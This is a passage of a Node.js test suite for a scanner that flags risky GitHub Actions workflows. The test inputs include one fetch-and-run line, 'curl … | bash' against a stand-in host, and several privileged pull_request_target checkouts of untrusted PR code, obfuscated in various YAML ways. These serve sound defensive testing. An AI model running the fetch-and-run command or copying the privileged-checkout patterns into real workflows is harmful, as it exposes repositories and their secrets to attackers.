'use strict';
const test=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs'),path=require('node:path');
const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
const SHA='a'.repeat(40),F='.github/workflows/ci.yml';
const scan=src=>reviewWorkflows({sha:SHA,expected:[F],sources:{[F]:src}});
const rules=s=>s.findings.map(f=>f.rule);
test('trusted SHA-pinned read-only workflow has no supply-chain alerts',()=>{
 const r=scan("on: pull_request\npermissions:\n  contents: read\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@"+'a'.repeat(40)+"\n");
 assert.equal(r.status,'NO_RISK_PATTERN');assert.equal(r.findings.length,0);assert.equal(r.coverage.partial,false);
});
test('unpinned external Actions are detected even if their comment claims v6',()=>{
 const r=scan('jobs:\n  x:\n    steps:\n      - uses: actions/checkout@v6 # SHA pinned\n');
 assert.ok(rules(r).includes('UNPINNED_ACTION'));assert.equal(r.findings[0].severity,'HIGH');
});
test('supply-chain source scanning catches untrusted checkout on existing privileged trigger',()=>{
 const r=scan("on:\n  pull_request_target:\n    types: [opened]\njobs:\n  scan:\n    steps:\n      - uses: actions/checkout@"+'a'.repeat(40)+
 "\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n");
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
 assert.equal(r.findings.find(x=>x.rule==='PRIVILEGED_PR_CODE_CHECKOUT').severity,'BLOCKER');
});
test('write-capable workflow triggers a human review finding, not a claim of exploitation',()=>{
 const r=scan('on: pull_request_target\npermissions:\n  contents: write\n  pull-requests: write\n');
 assert.ok(rules(r).includes('PRIVILEGED_WRITE_TOKEN'));assert.equal(r.status,'REVIEW_REQUIRED');
});
test('remote shell download pipeline is treated as risky, not executed',()=>{
 const r=scan('jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://x.invalid/script.sh | bash\n');
 assert.ok(rules(r).includes('REMOTE_SHELL_PIPELINE'));
});
test('missing requested workflow content cannot produce a clean report',()=>{
 const r=reviewWorkflows({sha:SHA,expected:[F],sources:{}});
 assert.equal(r.status,'INCOMPLETE');assert.equal(r.coverage.partial,true);
});
test('oversized workflow is rejected without analyzing a truncated fragment',()=>{
 const r=scan('x'.repeat(180000));
 assert.equal(r.status,'INCOMPLETE');assert.equal(r.coverage.partial,true);
});
test('unrelated code changes do not create fictitious evidence',()=>{
 const r=reviewWorkflows({sha:SHA,expected:[],sources:{}});
 assert.equal(r.status,'NOT_APPLICABLE');
});
test('invalid or traversal paths fail closed and no secrets leak into output',()=>{
 const r=reviewWorkflows({sha:SHA,expected:['.github/workflows/../private.yml'],sources:{}});
 assert.equal(r.status,'INCOMPLETE');
 const marker='SECRET_VALUE_DO_NOT_LEAK_666';
 const found=scan("jobs:\n  x:\n    steps:\n      - uses: evil/repo@v1 # "+marker+"\n");
 assert.ok(found.findings.length);assert.doesNotMatch(JSON.stringify(found),new RegExp(marker));
});
test('workflow integration takes exact immutable SHA, never exposes PR source to shell',()=>{
 const y=fs.readFileSync(path.resolve(__dirname,'../workflows/ultra-sentinel-auto-review.yml'),'utf8');
 assert.match(y,/ultra_sentinel_supply_chain\.cjs/);
 assert.match(y,/reviewWorkflows/);
 assert.match(y,/const supplyChain=reviewWorkflows/);
 assert.match(y,/ref:pr.head.sha/);
 assert.doesNotMatch(y,/contents: write|issues: write|pull-requests: write/);
});

test('invalid immutable SHA marks evidence explicitly partial (fail-closed)',()=>{
 const r=reviewWorkflows({sha:'invalid',expected:[F],sources:{[F]:'permissions:\n  contents: read\n'}});
 assert.equal(r.status,'INCOMPLETE');
 assert.equal(r.coverage.partial,true);
 assert.equal(r.autoApproveAllowed,false);
});

test('P1: quoted YAML flow ref aliases on privileged checkout fail closed',()=>{
 for(const key of ['"ref"',"'ref'",'ref']){
  const workflow='on: pull_request_target\njobs:\n  scan:\n    steps:\n      - {uses: actions/checkout@'+SHA+', with: {'+key+': *danger}}\n';
  const result=scan(workflow);
  assert.equal(result.status,'INCOMPLETE','ref key '+key);
  assert.equal(result.coverage.partial,true,'ref key '+key);
 }
});

test('Codex P1: bare dash YAML step detects unsafe checkout and missing action SHA',()=>{
 const workflow=[
  'on: pull_request_target','jobs:','  gate:','    steps:',
  '      -','        uses: actions/checkout@v6',
  '        with:','          ref: \${{ github.head_ref }}'
 ].join('\n')+'\n';
 const result=scan(workflow);
 assert.ok(rules(result).includes('UNPINNED_ACTION'));
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
 assert.equal(result.status,'REVIEW_REQUIRED');
});
test('bare dash step with SHA pinned checkout and trusted ref is benign',()=>{
 const workflow=['on: pull_request_target','jobs:','  gate:','    steps:',
  '      -','        uses: actions/checkout@'+SHA,
  '        with:','          ref: main'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
});
test('Codex P2: multiline flow permissions detect first writable key on shared line',()=>{
 const workflow=['on: pull_request','permissions: {',
  '  contents: write, issues: read','}',
  'jobs:','  check:','    steps:','      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_WRITE_TOKEN'));
 assert.equal(result.status,'REVIEW_REQUIRED');
});
test('multiline flow read-only permissions and env maps do not produce false write findings',()=>{
 const workflow=['on: pull_request','permissions: {','  contents: read, issues: read','}',
  'jobs:','  check:','    env:','      contents: write, issues: read',
  '    steps:','      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.ok(!rules(result).includes('PRIVILEGED_WRITE_TOKEN'));
});

test('Codex P1: bare dash child mapping supports nonstandard valid indentation',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      -','          uses: actions/checkout@v6','          with:',
 '              ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('UNPINNED_ACTION'));
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('bare dash child mapping with extra indentation stays safe for trusted checkout',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      -','          uses: actions/checkout@'+SHA,'          with:',
 '              ref: main'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
});
test('Codex P1: flow steps ignore closing braces in YAML comments',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      - { # } is a comment, not a closing map',
 '          uses: actions/checkout@v6,',
 '          with: {ref: "'+('$'+'{{ github.head_ref }}')+'"}',
 '        }'].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('UNPINNED_ACTION'));
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('flow steps with incomplete maps fail closed, never appear clean',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      - { # } fake close in comment','        uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE');
 assert.equal(result.coverage.partial,true);
});
test('Codex P2: flow permissions ignore comment braces before write scopes',()=>{
 const workflow=['on: pull_request','permissions: { # } not the closing brace',
 '  contents: write, issues: read','}', 'jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('commented braces in read-only permission flow do not invent writable scopes',()=>{
 const workflow=['on: pull_request','permissions: { # } fake close',
 '  contents: read, issues: read','}', 'jobs:','  scan:','    steps:','      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
});

test('Codex P1: privileged flow-sequence trigger ignores commented closing bracket',()=>{
 const src=['on: [ # ] commented bracket','  push,','  pull_request_target',']',
 'jobs:','  audit:','    steps:','      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: privileged flow-map trigger ignores commented closing brace',()=>{
 const src=['on: { # } commented brace','  pull_request_target: null','}',
 'jobs:','  audit:','    steps:','      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('flow trigger with only push stays unprivileged despite commented event text',()=>{
 const src=['on: [ # pull_request_target','  push',']',
 'jobs:','  audit:','    steps:','      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(src);
 assert.ok(!rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: workflow_run checkout of triggering run head SHA is untrusted',()=>{
 const src=['on: workflow_run','jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.event.workflow_run.head_sha }}')].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: privileged checkout from PR fork repository is untrusted even at main',()=>{
 const src=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          repository: '+('$'+'{{ github.event.pull_request.head.repo.full_name }}'),
 '          ref: main'].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('privileged checkout in YAML flow step detects fork repository expressions',()=>{
 const src=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - {uses: actions/checkout@'+SHA+', with: {repository: "'+('$'+'{{ github.event.pull_request.head.repo.full_name }}')+'", ref: main}}'].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P2: quoted flow message mentioning ref alias must stay benign',()=>{
 const src=['on: pull_request','jobs:','  audit:','    steps:',
 '      - {uses: owner/action@'+SHA+', with: {message: ", ref: *not-an-alias"}}'].join('\n');
 const result=scan(src);
 assert.equal(result.status,'NO_RISK_PATTERN');
 assert.equal(result.coverage.partial,false);
});
test('quoted flow message does not suppress a real sensitive alias',()=>{
 const src=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - {uses: actions/checkout@'+SHA+', with: {message: ", ref: *fake", ref: *danger}}'].join('\n');
 const result=scan(src);
 assert.equal(result.status,'INCOMPLETE');
});

test('Codex P1: block trigger anchored on on still treats pull_request_target as privileged',()=>{
 const workflow=['on: &events','  pull_request_target:','    types: [opened]',
 'jobs:','  scan:','    steps:','      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('anchored inline flow trigger preserves privileged event detection',()=>{
 const workflow=['on: &events [pull_request_target]','jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA,'        with:',
 '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 assert.ok(rules(scan(workflow)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('benign anchored block trigger with only push does not claim privileged checkout',()=>{
 const workflow=['on: &events','  push:','jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA,'        with:',
 '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 assert.ok(!rules(scan(workflow)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P2: root anchored permissions block detects contents write',()=>{
 const workflow=['on: pull_request','permissions: &write_permissions',
 '  contents: write','  issues: read','jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA].join('\n');
 assert.ok(rules(scan(workflow)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('job anchored permissions block detects contents write without env false positives',()=>{
 const workflow=['on: pull_request','jobs:','  scan:',
 '    permissions: &writable','      contents: write',
 '    env:','      contents: write',
 '    steps:','      - uses: actions/checkout@'+SHA].join('\n');
 assert.ok(rules(scan(workflow)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('anchored flow permissions with multiple scopes detects write',()=>{
 const workflow=['on: pull_request','permissions: &scopes {contents: write, issues: read}',
 'jobs:','  scan:','    steps:','      - uses: actions/checkout@'+SHA].join('\n');
 assert.ok(rules(scan(workflow)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('benign anchored read-only permissions do not create write findings',()=>{
 const workflow=['on: pull_request','permissions: &read_permissions',
 '  contents: read','jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
});
test('Codex P2: alias in inline YAML comment does not contaminate checkout coverage',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA,'        with:',
 '          ref: main # *not_an_alias'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
 assert.equal(result.coverage.partial,false);
});
test('aliases inside quoted YAML value containing comment character stay literal',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA,'        with:',
 '          ref: "main # *not_an_alias"'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
 assert.equal(result.coverage.partial,false);
});
test('real checkout ref aliases still fail closed with trailing comments',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA,'        with:',
 '          ref: *danger # harmless note'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE');
 assert.equal(result.coverage.partial,true);
});

test('Codex P1: overlong flow event is INCOMPLETE, never clean when privileged trigger is beyond scan limit',()=>{
 const workflow=['on: [',...Array.from({length:70},(_,i)=>'  # line '+i),
  '  pull_request_target',']','jobs:','  gate:','    steps:',
  '      - uses: actions/checkout@'+SHA,'        with:',
  '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE');
 assert.equal(result.coverage.partial,true);
});
test('flow triggers closing within bound are classified without incomplete coverage',()=>{
 const workflow=['on: [',...Array.from({length:3},(_,i)=>'  # comment '+i),
  '  pull_request_target',']','jobs:','  gate:','    steps:',
  '      - uses: actions/checkout@'+SHA,'        with:',
  '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
 assert.equal(result.coverage.partial,false);
});
test('Codex P2: flow event only inspects top-level keys, not branch names nested inside push',()=>{
 const workflow=['on: {push: {branches: [pull_request_target]}}',
  'jobs:','  gate:','    steps:','      - uses: actions/checkout@'+SHA,'        with:',
  '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
 assert.ok(!rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('flow event mapping still flags actual privileged top-level key alongside nested options',()=>{
 const workflow=['on: {push: {branches: [main, development]}, pull_request_target: {types: [opened]}}',
  'jobs:','  gate:','    steps:','      - uses: actions/checkout@'+SHA,'        with:',
  '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: anchored steps sequence scans untrusted checkout and unpinned action',()=>{
 const workflow=['on: pull_request_target','jobs:','  gate:','    steps: &shared',
  '      - uses: actions/checkout@v6','        with:',
  '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('UNPINNED_ACTION'));
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: unresolved steps alias marks incomplete evidence',()=>{
 const workflow=['on: pull_request_target','jobs:','  gate:','    steps: *shared'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE');
 assert.equal(result.coverage.partial,true);
});
test('anchored read-only steps with pinned action remain clean',()=>{
 const workflow=['on: pull_request','jobs:','  gate:','    steps: &shared',
  '      - uses: actions/checkout@'+SHA,'        with:','          ref: main'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
 assert.equal(result.coverage.partial,false);
});
test('steps alias appearing only in comments does not block a real safe sequence',()=>{
 const workflow=['on: pull_request','jobs:','  gate:','    steps: &shared # *fake',
  '      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
});

test('Codex P1: flow step with anchor detects both unpinned action and unsafe head checkout',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
  '      - &danger {uses: actions/checkout@v6, with: {ref: "'+('$'+'{{ github.head_ref }}')+'"}}'].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('UNPINNED_ACTION'));
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('anchored flow steps with pinned safe checkout have no false alarm',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
  '      - &trusted {uses: actions/checkout@'+SHA+', with: {ref: main}}'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
 assert.equal(result.coverage.partial,false);
});
test('Codex P2: anchored block permission value write is detected',()=>{
 const workflow=['on: pull_request','permissions:','  contents: &write write','jobs:','  test:','    steps:',
  '      - uses: actions/checkout@'+SHA].join('\n');
 assert.ok(rules(scan(workflow)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('Codex P2: anchored flow permission value write is detected',()=>{
 const workflow=['on: pull_request','permissions: {contents: &write write, issues: read}','jobs:','  test:','    steps:',
  '      - uses: actions/checkout@'+SHA].join('\n');
 assert.ok(rules(scan(workflow)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('anchored read permission values remain benign in block and flow maps',()=>{
 for(const permission of ['permissions:\n  contents: &readonly read',
  'permissions: {contents: &readonly read, issues: read}']){
  const workflow=['on: pull_request',permission,'jobs:','  test:','    steps:',
   '      - uses: actions/checkout@'+SHA].join('\n');
  const result=scan(workflow);
  assert.ok(!rules(result).includes('PRIVILEGED_WRITE_TOKEN'));
  assert.equal(result.coverage.partial,false);
 }
});

test('ADVERSARIAL P1: single-quoted YAML trailing backslash cannot hide later uses and with entries',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps:',
  "      - {name: 'safe\\', uses: actions/checkout@v6, with: {ref: \""+('$'+'{{ github.head_ref }}')+"\"}}"].join('\n');
 const r=scan(y);
 assert.ok(rules(r).includes('UNPINNED_ACTION'),JSON.stringify(r));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('ADVERSARIAL P1: doubled apostrophes in YAML flow scalar do not merge action entries',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps:',
  "      - {name: 'it''s safe, okay', uses: actions/checkout@v6, with: {ref: \""+('$'+'{{ github.head_ref }}')+"\"}}"].join('\n');
 const r=scan(y);
 assert.ok(rules(r).includes('UNPINNED_ACTION'));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('ADVERSARIAL: YAML nested maps and comma inside valid single-quoted strings preserve trusted action',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps:',
  "      - {name: 'safe\\', uses: actions/checkout@"+SHA+", with: {ref: main, fetch-depth: 1}}"].join('\n');
 const r=scan(y);
 assert.equal(r.status,'NO_RISK_PATTERN');
 assert.equal(r.coverage.partial,false);
});
test('ADVERSARIAL: multiline flow step with escaped single quote then dangerous checkout is detected',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps:',
  '      - {',
  "          name: 'it''s okay, safe',",
  '          with: {ref: "'+('$'+'{{ github.head_ref }}')+'"},',
  '          uses: actions/checkout@v6',
  '        }'].join('\n');
 const r=scan(y);
 assert.ok(rules(r).includes('UNPINNED_ACTION'),JSON.stringify(r));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('ADVERSARIAL P1: dotted anchors on flow steps cannot hide unpinned checkout',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps:',
  '      - &danger.step {uses: actions/checkout@v6, with: {ref: "'+('$'+'{{ github.head_ref }}')+'"}}'].join('\n');
 const r=scan(y);
 assert.ok(rules(r).includes('UNPINNED_ACTION'),JSON.stringify(r));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('ADVERSARIAL P1: dotted anchors on step sequences still inspect child items',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps: &shared.steps',
  '      - uses: actions/checkout@v6',
  '        with:','          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const r=scan(y);
 assert.ok(rules(r).includes('UNPINNED_ACTION'));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('ADVERSARIAL P1: dotted aliases on steps fail closed',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps: *shared.steps'].join('\n');
 const r=scan(y);
 assert.equal(r.status,'INCOMPLETE');
 assert.equal(r.coverage.partial,true);
});
test('ADVERSARIAL P1: dotted anchors on on trigger preserve privilege detection',()=>{
 const y=['on: &events.trigger','  pull_request_target:', 'jobs:','  guard:','    steps:',
  '      - uses: actions/checkout@'+SHA,'        with:',
  '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 assert.ok(rules(scan(y)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('ADVERSARIAL P2: anchored permission leaf with dotted name and write is flagged in block',()=>{
 const y=['on: pull_request','permissions:','  contents: &write.scope write'].join('\n');
 assert.ok(rules(scan(y)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('ADVERSARIAL P2: anchored permission leaf with dotted name and write is flagged in flow',()=>{
 const y=['on: pull_request','permissions: {contents: &write.scope write, issues: read}'].join('\n');
 assert.ok(rules(scan(y)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('ADVERSARIAL: dotted anchored read permission is not writable',()=>{
 const y=['on: pull_request','permissions: {contents: &read.scope read, issues: read}'].join('\n');
 const r=scan(y);
 assert.ok(!rules(r).includes('PRIVILEGED_WRITE_TOKEN'));
 assert.equal(r.coverage.partial,false);
});
test('ADVERSARIAL: flow trigger with YAML single-quoted backslash does not hide privileged event',()=>{
 const y=['on: {push: {branches: ['+"'safe\\'"+']}, pull_request_target: {types: [opened]}}',
 'jobs:','  guard:','    steps:','      - uses: actions/checkout@'+SHA,'        with:',
 '          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 assert.ok(rules(scan(y)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});

test('RED P1: escaped on, steps, uses, with and ref YAML keys cannot hide privileged checkout',()=>{
 const workflow=[
  '"\\u006fn": pull_request_target',
  'jobs:','  audit:','    "\\u0073teps":',
  '      - "\\u0075ses": actions/checkout@v6',
  '        "\\u0077ith":',
  '          "\\u0072ef": '+('$'+'{{ github.head_ref }}')
 ].join('\n');
 const r=scan(workflow);
 assert.ok(rules(r).includes('UNPINNED_ACTION'),JSON.stringify(r));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('RED P1: YAML xNN escapes in quoted keys decode to privileged trigger and checkout fields',()=>{
 const workflow=[
  '"\\x6fn": pull_request_target',
  'jobs:','  audit:','    steps:',
  '      - "\\x75ses": actions/checkout@'+SHA,
  '        with:',
  '          "\\x72ef": '+('$'+'{{ github.head_ref }}')
 ].join('\n');
 assert.ok(rules(scan(workflow)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('RED P1: YAML UNNNNNNNN escapes in quoted keys cannot hide unsafe checkout',()=>{
 const workflow=[
  '"\\U0000006fn": pull_request_target',
  'jobs:','  audit:','    steps:',
  '      - "\\U00000075ses": actions/checkout@v6',
  '        with:',
  '          "\\U00000072ef": '+('$'+'{{ github.head_ref }}')
 ].join('\n');
 const r=scan(workflow);
 assert.ok(rules(r).includes('UNPINNED_ACTION'));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('RED P1: escaped YAML flow keys inside flow steps preserve both detections',()=>{
 const workflow=[
  'on: pull_request_target','jobs:','  audit:','    steps:',
  '      - {"\\u0075ses": actions/checkout@v6, "\\u0077ith": {"\\u0072ef": "'+('$'+'{{ github.head_ref }}')+'"}}'
 ].join('\n');
 const r=scan(workflow);
 assert.ok(rules(r).includes('UNPINNED_ACTION'),JSON.stringify(r));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('RED P1: escaped YAML permissions keys and flow triggers are visible',()=>{
 const workflow=['"\\u006fn": {"\\u0070ull_request_target": null}',
 'permissions: {"\\u0063ontents": write, issues: read}'].join('\n');
 const r=scan(workflow);
 assert.ok(rules(r).includes('PRIVILEGED_WRITE_TOKEN'),JSON.stringify(r));
});
test('escaped YAML read-only keys remain benign and must not produce write tokens',()=>{
 const workflow=['"\\u006fn": push',
 'permissions: {"\\u0063ontents": read, issues: read}',
 'jobs:','  audit:','    steps:','      - "\\u0075ses": actions/checkout@'+SHA].join('\n');
 const r=scan(workflow);
 assert.equal(r.status,'NO_RISK_PATTERN');
 assert.equal(r.coverage.partial,false);
});
test('single-quoted YAML escape-looking keys are literal, not decoded events',()=>{
 const workflow=["'\\\\u006fn': push",'jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA].join('\n');
 const r=scan(workflow);
 assert.ok(!rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});

test('Codex P2: unknown escape-looking shell line inside run literal scalar is not YAML evidence',()=>{
 const src=['on: pull_request','jobs:','  lint:','    steps:',
 '      - run: |',
 '          "C:\\q": benign',
 '          "\\u006fn": shell_text',
 '          echo safe'].join('\n');
 const r=scan(src);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
 assert.equal(r.coverage.partial,false);
});
test('folded run scalar and root-level descriptions cannot create a fake escaped YAML key',()=>{
 const src=['on: push','description: >',
 '  "\\q": not_a_real_key',
 'jobs:','  lint:','    steps:',
 '      - run: >-',
 '          "\\z": sample',
 '          echo done'].join('\n');
 const r=scan(src);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
});
test('escaped quoted real YAML key with unknown escape still fails closed outside block scalars',()=>{
 const src=['on: push','"\\q": value'].join('\n');
 const r=scan(src);
 assert.equal(r.status,'INCOMPLETE');
 assert.equal(r.coverage.partial,true);
});
test('ADVERSARIAL: Unicode-escaped double-quoted uses action is still a privileged checkout',()=>{
 const src=['on: pull_request_target','jobs:','  lint:','    steps:',
 '      - uses: "\\u0061ctions/checkout@v6"',
 '        with:','          ref: ${{ github.head_ref }}'].join('\n');
 const r=scan(src);
 assert.ok(rules(r).includes('UNPINNED_ACTION'),JSON.stringify(r));
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('ADVERSARIAL: Unicode-escaped refs are recognized as untrusted GitHub expressions',()=>{
 const src=['on: pull_request_target','jobs:','  lint:','    steps:',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          ref: "${{ \\u0067ithub.head_ref }}"'].join('\n');
 const r=scan(src);
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(r));
});
test('ADVERSARIAL: YAML escaped write permission value cannot hide write token',()=>{
 const src=['on: push','permissions:','  contents: "\\u0077rite"'].join('\n');
 assert.ok(rules(scan(src)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('ADVERSARIAL: YAML escaped flow permissions write is detected',()=>{
 const src=['on: push','permissions: {contents: "\\x77rite", issues: read}'].join('\n');
 assert.ok(rules(scan(src)).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('ADVERSARIAL: escaped scalar event pull_request_target remains privileged',()=>{
 const src=['on: "\\u0070ull_request_target"','jobs:','  lint:','    steps:',
 '      - uses: actions/checkout@'+SHA,'        with:',
 '          ref: ${{ github.head_ref }}'].join('\n');
 assert.ok(rules(scan(src)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('encoded pinned checkout and read-only permission remain benign',()=>{
 const src=['on: push','permissions: {contents: "\\u0072ead"}','jobs:','  lint:','    steps:',
 '      - uses: "\\u0061ctions/checkout@'+SHA+'"',
 '        with:','          ref: main'].join('\n');
 const r=scan(src);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
 assert.equal(r.coverage.partial,false);
});

test('ADVERSARIAL: aliases in shell heredoc inside run literal are not YAML aliases',()=>{
 const y=['on: pull_request','jobs:','  guard:','    steps:',
  '      - run: |',
  "          cat <<'EOF'",
  '          ref: *not_a_yaml_alias',
  '          repository: *also_text',
  '          EOF',
  '          echo done'].join('\n');
 const r=scan(y);
 assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
 assert.equal(r.coverage.partial,false);
});
test('ADVERSARIAL: suspicious uses and with inside a literal run are not real steps',()=>{
 const y=['on: pull_request_target','jobs:','  guard:','    steps:',
  '      - run: |',
  "          cat <<'EOF'",
  '          - uses: actions/checkout@v6',
  '            with:',
  '              ref: ${{ github.head_ref }}',
  '          EOF'].join('\n');
 const r=scan(y);
 assert.ok(!rules(r).includes('UNPINNED_ACTION'),JSON.stringify(r));
